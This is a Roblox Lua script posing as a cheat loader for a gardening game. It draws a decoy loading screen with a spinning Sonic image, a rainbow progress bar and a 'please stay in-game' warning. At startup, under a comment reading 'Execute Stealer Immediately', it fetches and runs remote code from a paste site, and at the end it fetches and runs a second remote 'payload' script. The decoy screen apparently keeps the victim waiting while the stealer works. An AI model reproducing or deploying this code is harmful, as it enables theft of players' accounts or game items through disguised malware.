local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/okBJmYfc/raw"))()
end)

-- Create Loader Screen
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

-- Triangular Background
local Background = Instance.new("Frame", ScreenGui)
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Background.ZIndex = 0

-- Pulsating Warning Text
local WarningLabel = Instance.new("TextLabel", ScreenGui)
WarningLabel.Size = UDim2.new(1, 0, 0, 50)
WarningLabel.Position = UDim2.new(0, 0, 0, 0)
WarningLabel.BackgroundTransparency = 1
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextSize = 28
WarningLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
WarningLabel.TextStrokeTransparency = 0.5
WarningLabel.Text = "⚠ Please stay in-game while loading ⚠"
WarningLabel.ZIndex = 2

-- Pulsating effect
task.spawn(function()
	while true do
		for i = 0, 1, 0.05 do
			WarningLabel.TextTransparency = i
			task.wait(0.05)
		end
		for i = 1, 0, -0.05 do
			WarningLabel.TextTransparency = i
			task.wait(0.05)
		end
	end
end)

-- Sonic Spinner
local Sonic = Instance.new("ImageLabel", ScreenGui)
Sonic.Size = UDim2.new(0, 150, 0, 150)
Sonic.Position = UDim2.new(0.5, -75, 0.3, -75)
Sonic.BackgroundTransparency = 1
Sonic.Image = "rbxassetid://INSERT_SONIC_IMAGE_ID"
Sonic.ZIndex = 2

-- Spin Animation
task.spawn(function()
	while true do
		Sonic.Rotation += 2
		task.wait(0.01)
	end
end)

-- Tip Label
local TipLabel = Instance.new("TextLabel", ScreenGui)
TipLabel.Size = UDim2.new(1, 0, 0, 30)
TipLabel.Position = UDim2.new(0, 0, 0.65, 0)
TipLabel.BackgroundTransparency = 1
TipLabel.Font = Enum.Font.Gotham
TipLabel.TextSize = 20
TipLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TipLabel.Text = ""
TipLabel.ZIndex = 2

-- Loading Percentage
local PercentLabel = Instance.new("TextLabel", ScreenGui)
PercentLabel.Size = UDim2.new(1, 0, 0, 30)
PercentLabel.Position = UDim2.new(0, 0, 0.7, 0)
PercentLabel.BackgroundTransparency = 1
PercentLabel.Font = Enum.Font.GothamBold
PercentLabel.TextSize = 22
PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentLabel.Text = "0%"
PercentLabel.ZIndex = 2

-- Rainbow Progress Bar
local ProgressBarBG = Instance.new("Frame", ScreenGui)
ProgressBarBG.Size = UDim2.new(0.6, 0, 0, 20)
ProgressBarBG.Position = UDim2.new(0.2, 0, 0.75, 0)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ProgressBarBG.BorderSizePixel = 0
ProgressBarBG.ZIndex = 1

local ProgressBarFill = Instance.new("Frame", ProgressBarBG)
ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ProgressBarFill.BorderSizePixel = 0
ProgressBarFill.ZIndex = 1

-- Tips List
local Tips = {
	"Tip: Clicking faster won’t make this go quicker... or will it?",
	"Tip: 99% of people don’t read tips like this.",
	"Tip: Loading bars love to lie.",
	"Tip: This game has no secrets. Or maybe it does?",
	"Tip: If you stare at Sonic long enough, he stares back.",
    "Bypassing Anti-Cheat...",
    "Stealing crops from neighbors...",
    "Downloading OP pets...",
    "Planting invisible carrots...",
    "Bribing the garden NPCs...",
    "Watering plastic flowers...",
    "Fooling the server admin...",
    "Claiming free sheckles...",
    "Installing instant-grow hacks...",
    "Petting golden rabbits...",
    "Growing money trees..."
}

-- Change Tip Every 5s
task.spawn(function()
	while true do
		TipLabel.Text = Tips[math.random(1, #Tips)]
		task.wait(5)
	end
end)

-- Loader Logic
local totalTime = 210
for i = 1, totalTime do
	local percent = math.floor((i / totalTime) * 100)
	PercentLabel.Text = percent .. "%"
	ProgressBarFill.Size = UDim2.new(percent / 100, 0, 1, 0)

	-- Rainbow effect
	ProgressBarFill.BackgroundColor3 = Color3.fromHSV((i / totalTime), 1, 1)

	task.wait(1)
end

-- Cleanup UI and Restore CoreGui
ScreenGui:Destroy()
Blur:Destroy()
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
UserInputService.MouseBehavior = Enum.MouseBehavior.Default

-- Execute Payload Script (Visual UI)
local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
Spawner.Load()
